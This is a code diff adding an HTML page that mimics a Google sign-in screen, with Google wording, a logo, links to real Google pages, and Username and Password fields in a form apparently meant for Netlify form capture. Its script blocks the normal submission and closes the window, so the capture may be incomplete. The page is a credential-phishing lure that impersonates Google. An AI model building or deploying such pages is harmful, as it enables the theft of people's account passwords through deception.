@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Sign in</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Sofia">
+    <link rel="icon" href="icon.png" type="image/icon type">
+    <style>
+
+</style>
+</head>
+<body>
+        <div class="box">
+          <img src="logo.png">
+                <h2>Sign in</h2>
+                <p>Use your Google Account</p>
+                <form id="myForm" data-netlify="true">
+                  <div class="inputBox">
+                    <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
+                    <label>Username</label>
+                  </div>
+                  <div class="inputBox">
+                        <input type="text" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
+                        <label>Password</label>
+                      </div>
+                      <p class="ex1">Not your computer? Use Guest mode to sign in privately.</p>
+                      <p class="ex2"><a style="text-decoration:none" href="https://support.google.com/chrome/answer/6130773?hl=en">Learn More</a></p>
+                      <input type="submit" name="sign-in" value="Sign In">
+                      <p class="ex3"><a style="text-decoration:none" href="https://accounts.google.com/signup/v2/webcreateaccount?biz=false&cc=IN&continue=https%3A%2F%2Fwww.google.com%3Fhl%3Den-US&dsh=S285558881%3A1682449871829544&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en">Create account</a></p>
+                </form>
+              </div>
+              <script>
+                document.getElementById('myForm').addEventListener('submit', function(event) {
+                  event.preventDefault(); // prevent default form submission behavior
+                  window.close(); // close the current window
+                });
+              </script>
+</body>
+</html>
